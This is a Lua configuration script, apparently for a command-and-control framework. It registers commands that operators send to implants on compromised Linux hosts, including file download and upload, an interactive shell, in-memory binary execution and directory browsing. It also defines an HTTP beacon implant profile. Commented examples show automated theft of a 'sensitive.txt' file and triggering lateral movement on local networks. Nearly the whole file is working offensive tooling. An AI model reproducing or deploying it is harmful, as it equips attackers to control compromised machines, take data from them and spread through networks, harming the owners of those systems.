CODE = {
    PING = 1,
    SSH = 2,
    DOWN = 3,
    UPL = 4,
    KILL = 5,
    CD = 6,
    PWD = 7,
    LS = 8,
    MEMEXEC = 9,
    IFCONFIG = 10,
    CAT = 11
}

function ping(payload)
    lua_print("command ping from script args", payload, "\n")
    local task_id, err, session_id = add_task(CODE.PING, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end

    local session_info, session_err = session(session_id)
    if session_err then
        lua_print("Error: " .. session_err)
        return
    end
    local timeout = session_info.sleep + session_info.sleep * 1.5
    if timeout <= 0 then
        timeout = 30
    end

    -- Register a callback for this specific task
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
        session_print(session_info.id, "PING response from " .. hostname .. ": " .. response, task_id)
        -- You can add automation logic here
    end, timeout)
end

function ssh(payload)
    local task_id, err = add_task(CODE.SSH, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function download(payload)
    local task_id, err = add_task(CODE.DOWN, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function upload(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        lua_print("Usage: upload <source_path> <dest_path>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.UPL, lcs[0], lcs[1])
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function upload2(payload)
    opts = {}
    -- = "s=/tmp/image.png d=Lua"
    for k, v in string.gmatch(payload, "(%w+)=([%w/.]+)") do
        opts[k] = v
    end

    if not opts.s or not opts.d then
        lua_print("Usage: upload2 s=<source_path> d=<dest_path>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.UPL, opts.s, opts.d)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function kill(payload)
    local task_id, err = add_task(CODE.KILL, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function pwd(payload)
    local task_id, err = add_task(CODE.PWD, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function cd(payload)
    local task_id, err = add_task(CODE.CD, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function ls(payload)
    local task_id, err = add_task(CODE.LS, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function memexec(payload)
    local c = 0
    local lcs = {}
    for token in string.gmatch(payload, "[^%s]+") do 
        lcs[c] = token
        c=c+1
    end
    if #lcs ~= 1 then
        lua_print("Usage: memexec <binary_path> <args>")
        return
    end

    local task_id, err = add_task_upload_file(CODE.MEMEXEC, lcs[0], lcs[1])
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function ifconfig(payload)
    local task_id, err = add_task(CODE.IFCONFIG, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end

function cat(payload)
    local task_id, err = add_task(CODE.CAT, payload)
    if err then
        lua_print("Error: " .. err)
        return
    end
end


--[[
implant_register_profile("linux-beacon", {
    type     = "impl",
    lhost    = "10.0.0.1:4444",
    os       = "linux",
    arch     = "amd64",
    uri      = "/beacon",
    output   = "beacon",
    template = "./template",
})
]]

--[[
The first command argument is the payload type. It must exactly match the Type
presented by the implant during registration and the TYPE set on its build
profile. Type matching is case-sensitive. When a session is selected, only
commands registered for that session's type are suggested and dispatchable.

Valid type identifiers are 1-64 ASCII letters, digits, dots, underscores, or
hyphens. Each command name may contain letters, digits, underscores, or hyphens.
Register a command once for each payload type that implements it.
]]

-- payload_type, name, description, handler
command("impl", "ping", "Ping the implant", ping)
command("impl", "ssh", "Get an interactive session", ssh)
command("impl", "download", "Download a file", download)
command("impl", "upload", "Upload a file", upload)
command("impl", "kill", "Kill implant", kill)
command("impl", "pwd", "Get working dir", pwd)
command("impl", "cd", "Change dir", cd)
command("impl", "ls", "List dir", ls)
command("impl", "memexec", "Execute binary in memory", memexec)
command("impl", "ifconfig", "Display network interfaces", ifconfig)
command("impl", "cat", "Display file contents (first 10KB)", cat)


-- ##########################################################
-- Registering implants
local IMPLANT_DEF = {
    OS = {"linux"},
    ARCH = {"amd64", "i386"},
    PROTOCOL = "http",
    TYPE = "impl",
    SLEEP = 10,

    OPTIONS = {
        PATH = "/",
        HEADER = {
            ["User-Agent"] = "",
            ["X-Test"] = "Test"
        }
    }
    --OTS = "example-one-time-secret"
}

implant_register_profile("linux-impl", IMPLANT_DEF)



--[[
function OnRegister(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Payload type:", args[7])
end

function OnCheck(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Task:", args[7])
    print("Data:", args[8])
    print("Payload type:", args[9])
end

function OnResponse(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Task:", args[7])
    print("Response:", args[8])
    print("Payload type:", args[9])
end
]]

--[[ TASK-SPECIFIC CALLBACKS EXAMPLE

Task-specific callbacks allow you to register handlers for individual tasks,
enabling automation workflows. The callback is called when the task response
is received and is automatically removed after execution or timeout.

Task creation returns task_id, err, session_id. Existing code that reads only
task_id and err remains compatible. session(session_id) returns a metadata table
with fields including sleep, hostname, user, process, pid, transport, and status.

The optional third register_task_callback argument is a timeout in seconds. It
may be fractional. When omitted, the timeout is 2.5 times the session sleep,
with a 30-second fallback for sessions whose sleep is zero.

Example 1: Simple task callback
    local task_id, err, session_id = add_task(CODE.PWD, "")
    local session_info = session(session_id)
    local timeout = session_info.sleep + session_info.sleep * 1.5
    if timeout <= 0 then timeout = 30 end
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
        session_print(session_info.id, "Current directory: " .. response, task_id)
    end, timeout)

Example 2: Chain tasks based on response
    local task_id = add_task(CODE.LS, "/tmp")
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
        if string.match(response, "sensitive.txt") then
            lua_print("Found sensitive file, downloading...")
            add_task(CODE.DOWN, "/tmp/sensitive.txt")
        end
    end)

Example 3: Conditional automation
    local task_id = add_task(CODE.IFCONFIG, "")
    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user, payload_type)
        if string.match(response, "192.168") then
            lua_print(hostname .. " is on local network, proceeding with lateral movement")
            -- Add more tasks for lateral movement
        end
    end)

Callback parameters:
    - task_id: The unique task identifier
    - response: The task response data
    - name: Implant session name
    - uuid: Implant UUID
    - hostname: Target hostname  
    - user: Current user on target
    - payload_type: Payload family used for command routing

Note: Task-specific callbacks take precedence over the global OnResponse callback.
      The callback is removed after execution or expiration (one-time use).
      Expiration does not cancel the underlying implant task.

Thread-safe printing:
    Use lua_print() instead of print() in callbacks for thread-safe output.
    Use session_print(session_id, message, task_id) for output that should be
    routed to the matching session panel.
    lua_print() uses the AsyncWriteStdout function from the log package.
]]

function Main()
end
